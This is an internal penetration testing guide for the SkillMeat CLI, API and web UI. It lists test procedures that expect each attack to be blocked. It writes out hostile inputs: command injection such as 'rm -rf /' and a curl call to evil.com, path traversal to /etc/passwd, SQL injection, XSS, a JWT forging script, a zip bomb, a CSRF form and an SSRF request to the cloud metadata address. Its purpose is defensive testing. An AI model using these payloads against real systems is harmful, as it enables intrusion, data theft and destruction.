# SkillMeat Penetration Testing Guide

**Version**: 1.0
**Date**: 2025-11-17
**Scope**: SkillMeat v0.3.0-beta
**Classification**: Internal / Confidential

---

## 1. Executive Summary

This document provides comprehensive guidance for penetration testing the SkillMeat application. It outlines test scenarios, methodologies, tools, and expected security controls to validate before General Availability (GA) release.

**Testing Objective**: Identify and validate security vulnerabilities across all SkillMeat components.

**Test Environment**: Isolated test environment with non-production data.

---

## 2. Scope

### 2.1 In-Scope Components

**CLI Application**
- Bundle import/export operations
- Authentication and token management
- File system operations
- GitHub integration
- Marketplace operations

**Web API**
- RESTful API endpoints
- Authentication middleware
- Rate limiting
- Input validation
- CORS configuration

**Web UI**
- React frontend
- API integration
- Session management
- XSS prevention

**Storage Systems**
- Local file system (`~/.skillmeat/`)
- OS keychain integration
- Encrypted file storage
- Collection management

**Cryptography**
- Ed25519 bundle signing
- Key generation and storage
- Signature verification
- Hash computation

### 2.2 Out-of-Scope

- Social engineering attacks
- Physical security
- Client-side vulnerabilities in Claude Desktop
- Third-party dependencies (tested separately)
- DoS attacks requiring significant resources

---

## 3. Test Methodology

### 3.1 Testing Phases

**Phase 1: Reconnaissance (1-2 days)**
- Application mapping
- Technology stack identification
- Attack surface analysis
- Dependency enumeration

**Phase 2: Vulnerability Assessment (3-5 days)**
- Automated scanning
- Manual code review
- Configuration analysis
- Input validation testing

**Phase 3: Exploitation (3-5 days)**
- Exploit development
- Privilege escalation attempts
- Data exfiltration testing
- Persistence mechanisms

**Phase 4: Post-Exploitation (1-2 days)**
- Impact assessment
- Remediation validation
- Report generation

**Total Duration**: 8-14 days

### 3.2 Testing Approach

**Black Box**: Initial testing without access to source code
**Gray Box**: Testing with limited source code access
**White Box**: Full access to source code and architecture

**Recommended**: Gray Box (realistic attacker with some reconnaissance)

---

## 4. Test Scenarios

### 4.1 Bundle Security Tests

#### Test 1: Malicious Bundle Injection

**Objective**: Attempt to inject malicious code via bundle import

**Procedure**:
```bash
# Step 1: Create bundle with path traversal
mkdir -p /tmp/malicious-bundle/test-skill
echo "malicious content" > "/tmp/malicious-bundle/../../../etc/passwd"
cd /tmp/malicious-bundle
echo "# Test" > test-skill/SKILL.md

# Step 2: Export bundle
skillmeat export malicious-bundle --output /tmp/malicious.skillmeat-pack

# Step 3: Attempt import
skillmeat import /tmp/malicious.skillmeat-pack
```

**Expected Result**: Import rejected with path traversal error

**Success Criteria**:
- [ ] Path traversal detected
- [ ] Error message displayed
- [ ] No files written outside collection directory
- [ ] Operation logged

**Actual Result**: _______________

**Risk Level if Failed**: CRITICAL

---

#### Test 2: Unsigned Bundle Acceptance

**Objective**: Verify unsigned bundles are properly flagged

**Procedure**:
```bash
# Step 1: Create unsigned bundle
skillmeat export test-bundle --no-sign --output /tmp/unsigned.skillmeat-pack

# Step 2: Attempt installation from marketplace
# (Marketplace should require signatures)

# Step 3: Attempt import with signature verification
skillmeat import /tmp/unsigned.skillmeat-pack --require-signature
```

**Expected Result**:
- Warning displayed for unsigned bundle
- Import rejected if `--require-signature` flag used
- Installation from marketplace rejected

**Success Criteria**:
- [ ] Unsigned bundle detected
- [ ] Clear warning message
- [ ] Option to proceed (for local bundles) or reject (for marketplace)
- [ ] User consent required

**Actual Result**: _______________

**Risk Level if Failed**: HIGH

---

#### Test 3: Signature Tampering

**Objective**: Verify tampered bundles are rejected

**Procedure**:
```bash
# Step 1: Create signed bundle
skillmeat export test-bundle --sign --output /tmp/signed.skillmeat-pack

# Step 2: Tamper with bundle
echo "TAMPERED" >> /tmp/signed.skillmeat-pack

# Step 3: Attempt import
skillmeat import /tmp/signed.skillmeat-pack
```

**Expected Result**: Import rejected with signature verification error

**Success Criteria**:
- [ ] Tampering detected
- [ ] Signature verification failed
- [ ] Clear error message
- [ ] Bundle not imported

**Actual Result**: _______________

**Risk Level if Failed**: CRITICAL

---

#### Test 4: Zip Bomb Attack

**Objective**: Test resistance to zip bomb attacks

**Procedure**:
```python
#!/usr/bin/env python3
import zipfile

# Create zip bomb (1MB compressed -> 1GB uncompressed)
with zipfile.ZipFile('/tmp/zipbomb.zip', 'w', compression=zipfile.ZIP_DEFLATED) as zf:
    # Create highly compressible data
    data = b'0' * (1024 * 1024 * 1024)  # 1GB of zeros
    zf.writestr('data.txt', data)

    # Add manifest
    zf.writestr('manifest.json', '{"metadata": {"name": "zipbomb", "version": "1.0.0", "description": "Test", "author": "Test", "license": "MIT"}, "artifacts": []}')
```

```bash
# Attempt to import
skillmeat import /tmp/zipbomb.zip
```

**Expected Result**: Import rejected with compression ratio error

**Success Criteria**:
- [ ] Compression ratio checked
- [ ] High ratio detected (>100:1)
- [ ] Import rejected
- [ ] No disk exhaustion

**Actual Result**: _______________

**Risk Level if Failed**: MEDIUM

**Note**: Zip bomb detection is a future enhancement. Test documents expected behavior.

---

### 4.2 API Security Tests

#### Test 5: Rate Limit Bypass

**Objective**: Attempt to bypass API rate limiting

**Procedure**:
```python
#!/usr/bin/env python3
import requests
import time

url = "http://localhost:8000/api/marketplace/listings"
headers = {"Authorization": "Bearer <token>"}

# Attempt 200 requests (exceeds 100/hr limit)
for i in range(200):
    response = requests.get(url, headers=headers)
    print(f"Request {i+1}: {response.status_code}")

    if response.status_code == 429:
        print(f"Rate limited after {i+1} requests")
        break

    time.sleep(1)  # Slow down to avoid network issues
```

**Expected Result**: 429 Too Many Requests after 100 requests

**Success Criteria**:
- [ ] Rate limit enforced at 100 requests/hour
- [ ] HTTP 429 status code returned
- [ ] Retry-After header present
- [ ] Rate limit resets after time window

**Actual Result**: _______________

**Risk Level if Failed**: MEDIUM

---

#### Test 6: Authentication Bypass

**Objective**: Attempt to access API without valid authentication

**Procedure**:
```bash
# Test 1: No Authorization header
curl http://localhost:8000/api/marketplace/install \
  -H "Content-Type: application/json" \
  -d '{"bundle_id": "test-bundle"}'

# Test 2: Invalid token
curl http://localhost:8000/api/marketplace/install \
  -H "Authorization: Bearer invalid_token_12345" \
  -H "Content-Type: application/json" \
  -d '{"bundle_id": "test-bundle"}'

# Test 3: Expired token
curl http://localhost:8000/api/marketplace/install \
  -H "Authorization: Bearer <expired_token>" \
  -H "Content-Type: application/json" \
  -d '{"bundle_id": "test-bundle"}'

# Test 4: Malformed token
curl http://localhost:8000/api/marketplace/install \
  -H "Authorization: Bearer not.a.jwt" \
  -H "Content-Type: application/json" \
  -d '{"bundle_id": "test-bundle"}'
```

**Expected Result**: All requests return 401 Unauthorized

**Success Criteria**:
- [ ] Missing auth header: 401
- [ ] Invalid token: 401
- [ ] Expired token: 401
- [ ] Malformed token: 401
- [ ] Generic error message (no token details)

**Actual Result**: _______________

**Risk Level if Failed**: CRITICAL

---

#### Test 7: JWT Token Manipulation

**Objective**: Attempt to forge or manipulate JWT tokens

**Procedure**:
```python
#!/usr/bin/env python3
import jwt
import base64

# Get a valid token
valid_token = "<valid_jwt_token>"

# Decode token (without verification)
payload = jwt.decode(valid_token, options={"verify_signature": False})
print(f"Original payload: {payload}")

# Attempt 1: Change expiration
payload['exp'] = 9999999999
fake_token_1 = jwt.encode(payload, "wrong_secret", algorithm="HS256")

# Attempt 2: Change user ID
payload['jti'] = "admin-token-id"
fake_token_2 = jwt.encode(payload, "wrong_secret", algorithm="HS256")

# Attempt 3: Algorithm confusion (HS256 -> none)
fake_token_3 = base64.urlsafe_b64encode(b'{"alg":"none"}').decode() + "." + \
               base64.urlsafe_b64encode(str(payload).encode()).decode() + "."

# Test all fake tokens
import requests
for i, token in enumerate([fake_token_1, fake_token_2, fake_token_3], 1):
    response = requests.get(
        "http://localhost:8000/api/marketplace/listings",
        headers={"Authorization": f"Bearer {token}"}
    )
    print(f"Fake token {i}: {response.status_code}")
```

**Expected Result**: All manipulated tokens rejected with 401

**Success Criteria**:
- [ ] Modified expiration rejected
- [ ] Modified claims rejected
- [ ] Algorithm confusion prevented
- [ ] Signature validation enforced

**Actual Result**: _______________

**Risk Level if Failed**: CRITICAL

---

### 4.3 Input Validation Tests

#### Test 8: SQL Injection

**Objective**: Test for SQL injection vulnerabilities

**Procedure**:
```bash
# Test various injection payloads
# (Note: SkillMeat uses TOML/JSON, not SQL, but test anyway)

skillmeat publish bundle.skillmeat-pack \
  --tags "tag1'; DROP TABLE bundles;--"

skillmeat publish bundle.skillmeat-pack \
  --description "Test' OR '1'='1"

skillmeat publish bundle.skillmeat-pack \
  --name "bundle-name'; DELETE FROM users;--"
```

**Expected Result**: Input validation rejects special characters

**Success Criteria**:
- [ ] SQL-like payloads sanitized
- [ ] No command execution
- [ ] Input validation error message
- [ ] Tags validated against whitelist

**Actual Result**: _______________

**Risk Level if Failed**: CRITICAL (if SQL used), LOW (current architecture)

---

#### Test 9: Command Injection

**Objective**: Test for command injection via CLI arguments

**Procedure**:
```bash
# Test 1: Shell metacharacters in artifact name
skillmeat add "skill; rm -rf /"

# Test 2: Command substitution
skillmeat add "skill\$(whoami)"

# Test 3: Pipe commands
skillmeat add "skill | cat /etc/passwd"

# Test 4: Backtick command substitution
skillmeat add "skill\`id\`"

# Test 5: MCP server name injection
skillmeat mcp deploy "server; curl http://evil.com/exfiltrate"
```

**Expected Result**: All inputs sanitized, no command execution

**Success Criteria**:
- [ ] Shell metacharacters rejected
- [ ] Command substitution prevented
- [ ] Pipe operators handled safely
- [ ] Input validation errors displayed

**Actual Result**: _______________

**Risk Level if Failed**: CRITICAL

---

#### Test 10: Path Traversal in CLI

**Objective**: Test path traversal in various CLI commands

**Procedure**:
```bash
# Test 1: Add with path traversal
skillmeat add "../../etc/passwd"

# Test 2: Remove with path traversal
skillmeat remove "../../../.bashrc"

# Test 3: Deploy with path traversal
skillmeat deploy "skill/../../../etc/shadow"

# Test 4: Export with path traversal
skillmeat export "../../../sensitive-data"

# Test 5: Import with path traversal
skillmeat import "../../../../../../etc/passwd.skillmeat-pack"
```

**Expected Result**: All path traversal attempts blocked

**Success Criteria**:
- [ ] Parent directory references rejected
- [ ] Absolute paths validated
- [ ] Symlink traversal prevented
- [ ] Operations stay within collection directory

**Actual Result**: _______________

**Risk Level if Failed**: CRITICAL

---

### 4.4 Secrets Management Tests

#### Test 11: Secret Detection Bypass

**Objective**: Test if obfuscated secrets bypass detection

**Procedure**:
```python
# Create skill with obfuscated secrets
cat > /tmp/test-skill/config.py <<'EOF'
# Obfuscation attempt 1: String concatenation
KEY = 'AKIA' + 'IOSFODNN' + '7EXAMPLE'

# Obfuscation attempt 2: Base64 encoding
import base64
SECRET = base64.b64decode('d0phbHJYVXRuRkVNSS9LN01ERU5HL2JQeGZmaUNZRVhBTVBMRUtFWQ==')

# Obfuscation attempt 3: Hex encoding
TOKEN = bytes.fromhex('676870315f31323334353637383930616263646566')

# Obfuscation attempt 4: Environment variable (should be OK)
import os
SAFE_KEY = os.environ.get('API_KEY')
EOF

# Attempt to export
skillmeat export test-skill --output /tmp/test.skillmeat-pack
```

**Expected Result**:
- Simple obfuscation may bypass detection (expected limitation)
- Warning provided for review
- Pattern matching detects obvious patterns

**Success Criteria**:
- [ ] Direct secrets detected
- [ ] Base64-encoded secrets: PARTIAL detection
- [ ] Hex-encoded secrets: PARTIAL detection
- [ ] Warning to review code manually

**Actual Result**: _______________

**Risk Level if Failed**: MEDIUM (some obfuscation expected to bypass)

---

#### Test 12: Environment File Exposure

**Objective**: Verify warnings for .env files in bundles

**Procedure**:
```bash
# Create bundle with .env file
mkdir -p /tmp/env-test/test-skill
cat > /tmp/env-test/test-skill/.env <<EOF
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG
DATABASE_URL=postgres://user:pass@localhost/db
EOF

echo "# Test" > /tmp/env-test/test-skill/SKILL.md

# Export bundle
cd /tmp/env-test
skillmeat export test-skill --output /tmp/env-test.skillmeat-pack
```

**Expected Result**: Warning displayed about .env file

**Success Criteria**:
- [ ] .env file detected
- [ ] Warning displayed
- [ ] User confirmation required
- [ ] Secrets within .env also detected

**Actual Result**: _______________

**Risk Level if Failed**: HIGH

---

### 4.5 Cryptography Tests

#### Test 13: Weak Cryptography

**Objective**: Verify no weak cryptographic algorithms used

**Procedure**:
```bash
# Search codebase for weak algorithms
grep -r "MD5\|SHA1\|DES\|RC4" skillmeat/ --include="*.py"

# Check for weak key sizes
grep -r "RSA.*1024\|DSA.*1024" skillmeat/ --include="*.py"

# Verify no deprecated SSL/TLS
grep -r "PROTOCOL_SSLv[23]\|PROTOCOL_TLSv1[^2]" skillmeat/ --include="*.py"
```

**Expected Result**: No weak cryptography found

**Success Criteria**:
- [ ] No MD5 or SHA1 for security (OK for checksums)
- [ ] No weak ciphers (DES, RC4)
- [ ] RSA >= 2048 bits (or Ed25519 used)
- [ ] TLS 1.2+ only

**Actual Result**: _______________

**Risk Level if Failed**: HIGH

---

#### Test 14: Key Storage Security

**Objective**: Verify signing keys stored securely

**Procedure**:
```bash
# Generate signing key
skillmeat signing keygen --name test-key

# Check key storage location
find ~/.skillmeat -name "*key*" -ls

# Check file permissions
ls -la ~/.skillmeat/signing-keys/

# Attempt to read key without keychain access
# (Should be encrypted or in OS keychain)
cat ~/.skillmeat/signing-keys/* 2>&1

# Check if keys appear in logs
grep -i "private.*key" ~/.skillmeat/logs/*.log
```

**Expected Result**:
- Keys stored in OS keychain (preferred)
- Fallback encrypted storage with 0600 permissions
- Keys never in logs

**Success Criteria**:
- [ ] OS keychain used (macOS/Windows/Linux)
- [ ] Encrypted file storage fallback
- [ ] File permissions 0600
- [ ] No keys in logs or error messages

**Actual Result**: _______________

**Risk Level if Failed**: CRITICAL

---

### 4.6 Network Security Tests

#### Test 15: Man-in-the-Middle (MitM)

**Objective**: Test TLS/SSL security for marketplace downloads

**Procedure**:
```bash
# Set up mitmproxy or Burp Suite to intercept HTTPS

# Attempt 1: Certificate validation
# Start mitmproxy with custom cert
mitmproxy --mode regular --listen-port 8080

# Configure proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080

# Attempt marketplace download
skillmeat marketplace search test

# Attempt 2: TLS downgrade
# Use sslstrip or similar tool

# Attempt 3: Self-signed certificate
# Present self-signed cert for marketplace domain
```

**Expected Result**: All MitM attempts fail

**Success Criteria**:
- [ ] Certificate validation enforced
- [ ] Self-signed certs rejected
- [ ] No HTTP fallback
- [ ] TLS downgrade prevented
- [ ] Clear error message for cert issues

**Actual Result**: _______________

**Risk Level if Failed**: CRITICAL

---

#### Test 16: SSRF (Server-Side Request Forgery)

**Objective**: Test for SSRF vulnerabilities

**Procedure**:
```bash
# Test 1: Malicious URL in bundle metadata
skillmeat publish bundle.skillmeat-pack \
  --repository "http://169.254.169.254/latest/meta-data/"

# Test 2: File URL scheme
skillmeat add "file:///etc/passwd"

# Test 3: Internal network access
skillmeat add "http://localhost:22/internal-service"

# Test 4: URL redirect chain
# Create URL that redirects to internal resource
```

**Expected Result**: All SSRF attempts blocked

**Success Criteria**:
- [ ] Only HTTPS GitHub URLs allowed
- [ ] File URLs rejected
- [ ] Internal IP addresses blocked
- [ ] URL validation before requests

**Actual Result**: _______________

**Risk Level if Failed**: MEDIUM (limited attack surface in current design)

---

### 4.7 Web UI Tests

#### Test 17: Cross-Site Scripting (XSS)

**Objective**: Test for XSS vulnerabilities in web UI

**Procedure**:
```bash
# Test 1: Stored XSS in bundle description
skillmeat publish bundle.skillmeat-pack \
  --description "<script>alert('XSS')</script>"

# Test 2: Reflected XSS in search
curl "http://localhost:3000/search?q=<script>alert('XSS')</script>"

# Test 3: DOM XSS in artifact names
skillmeat add "skill<img src=x onerror=alert('XSS')>"

# Test 4: JavaScript URL
skillmeat add "javascript:alert('XSS')"
```

**Expected Result**: All XSS attempts sanitized

**Success Criteria**:
- [ ] HTML entities escaped
- [ ] Script tags not executed
- [ ] Event handlers stripped
- [ ] JavaScript URLs blocked
- [ ] React escaping working correctly

**Actual Result**: _______________

**Risk Level if Failed**: HIGH

---

#### Test 18: CSRF (Cross-Site Request Forgery)

**Objective**: Test for CSRF vulnerabilities

**Procedure**:
```html
<!-- Create malicious page -->
<html>
<body>
<form action="http://localhost:8000/api/marketplace/install" method="POST">
  <input type="hidden" name="bundle_id" value="malicious-bundle">
  <input type="submit" value="Click here for free stuff">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

**Expected Result**: CSRF attempt fails

**Success Criteria**:
- [ ] CORS configured for localhost only
- [ ] JWT in Authorization header (not cookies)
- [ ] No cookie-based authentication
- [ ] SameSite cookie attribute (if cookies used)

**Actual Result**: _______________

**Risk Level if Failed**: HIGH (if cookies used), LOW (current JWT design)

---

## 5. Tools

### 5.1 Recommended Tools

**Static Analysis**
- `bandit` - Python security scanner
- `semgrep` - Pattern-based code analysis
- `mypy` - Type checking
- `trufflehog` - Secret scanning

**Dynamic Analysis**
- `OWASP ZAP` - Web application scanner
- `Burp Suite` - HTTP proxy and scanner
- `mitmproxy` - TLS proxy for testing
- `sqlmap` - SQL injection testing (limited use)

**Dependency Scanning**
- `safety` - Python dependency vulnerability scanner
- `pip-audit` - Audit Python packages
- `snyk` - Dependency and container scanning

**Fuzzing**
- `AFL` - American Fuzzy Lop
- `radamsa` - General-purpose fuzzer
- `python-afl` - Python fuzzing

**Network**
- `nmap` - Port scanning
- `wireshark` - Network traffic analysis
- `tcpdump` - Packet capture

### 5.2 Tool Usage

**Bandit Scan**:
```bash
bandit -r skillmeat/ -f json -o bandit-report.json
```

**Safety Check**:
```bash
safety check --json > safety-report.json
```

**OWASP ZAP Scan**:
```bash
zap-cli quick-scan --self-contained --spider http://localhost:3000
```

**TruffleHog Secret Scan**:
```bash
trufflehog filesystem /home/user/skillmeat --json > secrets-report.json
```

---

## 6. Severity Classification

### 6.1 Risk Levels

**CRITICAL**
- Remote code execution
- Authentication bypass
- Signature forgery
- Arbitrary file write
- Private key exposure

**HIGH**
- Privilege escalation
- Secrets leakage
- Path traversal with data access
- XSS with session theft
- MitM without signature verification

**MEDIUM**
- Rate limit bypass
- Information disclosure
- Zip bomb DoS
- SSRF to internal resources
- Insecure cryptography

**LOW**
- Verbose error messages
- Missing security headers
- Weak CORS policy
- No audit logging
- Missing input validation

### 6.2 Remediation Timelines

| Severity | Remediation Deadline | Approval |
|----------|---------------------|----------|
| CRITICAL | 24-48 hours | Security Lead + Engineering Lead |
| HIGH | 1 week | Security Lead |
| MEDIUM | 1 month | Engineering Lead |
| LOW | 3 months | Product Owner |

---

## 7. Reporting

### 7.1 Report Structure

**Executive Summary**
- Test scope and objectives
- Overall security posture
- Critical findings summary
- Risk rating

**Detailed Findings**
For each vulnerability:
1. **Title**: Brief description
2. **Severity**: Critical/High/Medium/Low
3. **CVSS Score**: Base score (if applicable)
4. **Description**: Technical details
5. **Impact**: What can attacker achieve
6. **Proof of Concept**: Steps to reproduce
7. **Remediation**: How to fix
8. **References**: CWE, OWASP, CVE

**Appendix**
- Test methodology
- Tools used
- Raw scan results
- Screenshots

### 7.2 Report Template

```markdown
# Penetration Test Report: SkillMeat v0.3.0-beta

## Executive Summary

**Test Date**: [Date]
**Tester**: [Name]
**Duration**: [Days]
**Scope**: SkillMeat CLI, API, Web UI

**Overall Rating**: [PASS/CONDITIONAL PASS/FAIL]

**Summary**:
- Critical: [Count]
- High: [Count]
- Medium: [Count]
- Low: [Count]

## Detailed Findings

### CRITICAL-001: [Title]

**Severity**: Critical
**CVSS**: 9.8
**Status**: [Open/Mitigated/Accepted]

**Description**: [Detailed description]

**Impact**: [What attacker can do]

**Proof of Concept**:
\`\`\`
[Steps to reproduce]
\`\`\`

**Remediation**: [Fix recommendations]

**References**:
- CWE-XXX
- OWASP A0X

---

## Recommendations

1. [Recommendation 1]
2. [Recommendation 2]
...

## Appendix

### Tools Used
- [Tool list]

### Scan Results
- [Attached files]
```

---

## 8. Post-Test Activities

### 8.1 Remediation Verification

After fixes implemented:
1. Re-test specific vulnerabilities
2. Verify no regression
3. Update security documentation
4. Sign off on fixes

### 8.2 Continuous Testing

**Schedule**:
- Pre-release: Full penetration test
- Quarterly: Targeted vulnerability assessment
- Post-major-feature: Security review
- Continuous: Automated scanning (CI/CD)

**Automated Scans**:
```yaml
# .github/workflows/security-scan.yml
- Bandit (Python security)
- Safety (Dependencies)
- TruffleHog (Secrets)
- Semgrep (Code patterns)
```

---

## 9. Legal and Ethical Considerations

### 9.1 Authorization

**Required**:
- Written authorization from SkillMeat project owner
- Defined scope and boundaries
- Emergency contact information
- Data handling agreement

### 9.2 Responsible Disclosure

If vulnerabilities found:
1. Report privately to security team
2. Do not disclose publicly before patch
3. Follow coordinated disclosure timeline
4. Respect embargo periods

### 9.3 Data Handling

- No production data used in tests
- Test data anonymized
- Secure storage of test results
- Destruction of sensitive test artifacts

---

## 10. References

**Industry Standards**:
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- NIST SP 800-115: Technical Guide to Information Security Testing
- PTES: Penetration Testing Execution Standard
- OSSTMM: Open Source Security Testing Methodology Manual

**SkillMeat Security Docs**:
- Threat Model: `docs/security/threat-model.md`
- Security Checklist: `docs/security/security-checklist.md`
- Security Review: `docs/security/SECURITY_REVIEW.md`
- Signing Policy: `docs/security/SIGNING_POLICY.md`

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2025-11-17 | P5-004 Security Review | Initial guide |

**Next Review**: After GA release

**Approvals**:
- [ ] Security Lead
- [ ] Engineering Lead
- [ ] Legal (if external testing)

---

**Classification**: Internal / Confidential
**Distribution**: Security team, Engineering leads
**Last Updated**: 2025-11-17
